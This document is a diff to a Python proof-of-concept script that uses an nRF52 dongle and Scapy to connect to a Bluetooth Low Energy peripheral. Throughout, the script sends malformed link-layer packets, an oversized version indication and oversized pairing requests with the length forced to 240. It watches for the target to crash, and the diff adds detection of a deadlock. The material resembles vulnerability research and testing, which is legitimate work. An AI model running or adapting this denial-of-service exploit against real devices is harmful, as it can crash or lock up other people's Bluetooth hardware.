@@ -23,7 +23,9 @@ none_count = 0
 end_connection = False
 connecting = False
 slave_addr_type = 0
-switch_length_pkt = 0
+switch_length_pkt = False
+run_script = True
+disconn_count = 0
 
 # Autoreset colors
 colorama.init(autoreset=True)
@@ -58,17 +60,24 @@ def crash_timeout():
 # disable_timeout('scan_timeout')
 
 def scan_timeout():
-    global connecting, switch_length_pkt, slave_addr_type
+    global connecting, slave_addr_type
     scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
         ScanA=master_address,
         AdvA=advertiser_address)
     driver.send(scan_req)
     connecting = False
     start_timeout('scan_timeout', 2, scan_timeout)
-    if switch_length_pkt:
-        switch_length_pkt = 0
+
+
+def completion_timeout():
+    global disconn_count, run_script
+    if disconn_count < 4:
+        disconn_count += 1
+        print(Fore.YELLOW + 'Peripheral not responding')
     else:
-        switch_length_pkt = 1
+        print(Fore.RED + "Peripheral seems unresponsive (deadlock).\n"
+                         "Check if you can connect to the peripheral by other means (i.g., mobile app)")
+        run_script = False
 
 
 # Open serial port of NRF52 Dongle
@@ -82,7 +91,7 @@ driver.send(scan_req)
 start_timeout('scan_timeout', 2, scan_timeout)
 
 print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
-while True:
+while run_script:
     pkt = None
     # Receive packet from the NRF52 Dongle
     data = driver.raw_receive()
@@ -130,9 +139,11 @@ while True:
         elif BTLE_DATA in pkt and connecting == True:
             connecting = False
             print(Fore.GREEN + 'Slave Connected (L2Cap channel established)')
+            start_timeout('completion_timeout', 1.5, completion_timeout)
             # Send version indication request
             pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
-            if switch_length_pkt == True:
+            if switch_length_pkt is True:
+                switch_length_pkt = False
                 print(Fore.YELLOW + 'Sending oversized version indication')
                 pkt[BTLE_DATA].len = 240  # The magic happens here
                 end_connection = True
@@ -153,7 +164,10 @@ while True:
             pairing_req = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Pairing_Request(
                 iocap=4, oob=0, authentication=0x05, max_key_size=16, initiator_key_distribution=0x07,
                 responder_key_distribution=0x07)
-            pairing_req[BTLE_DATA].len = 240  # The magic happens here
+            if switch_length_pkt is False:
+                switch_length_pkt = True
+                print(Fore.YELLOW + 'Sending oversized pairing request')
+                pairing_req[BTLE_DATA].len = 240  # The magic happens here
             driver.send(pairing_req)
             end_connection = True
 
@@ -161,7 +175,8 @@ while True:
             pairing_req = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Pairing_Request(
                 iocap=4, oob=0, authentication=0x05, max_key_size=16, initiator_key_distribution=0x07,
                 responder_key_distribution=0x07)
-            if switch_length_pkt == False:
+            if switch_length_pkt is False:
+                switch_length_pkt = True
                 print(Fore.YELLOW + 'Sending oversized pairing request')
                 pairing_req[BTLE_DATA].len = 240  # The magic happens here
             driver.send(pairing_req)
@@ -169,7 +184,7 @@ while True:
 
         elif SM_Pairing_Response in pkt:
             pairing_req = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Public_Key()
-            driver.send(pairing_req)
+            driver.send(pairing_req)  # Send an arbitrary smp packet (public key)
 
         elif LL_LENGTH_REQ in pkt:
             length_rsp = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_RSP(
@@ -178,6 +193,8 @@ while True:
 
         elif end_connection == True:
             end_connection = False
+            disconn_count = 0
+            disable_timeout('completion_timeout')
             scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
                 ScanA=master_address,
                 AdvA=advertiser_address)
@@ -186,9 +203,5 @@ while True:
             print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
             driver.send(scan_req)
             start_timeout('crash_timeout', 7, crash_timeout)
-            if switch_length_pkt:
-                switch_length_pkt = 0
-            else:
-                switch_length_pkt = 1
 
     sleep(0.01)
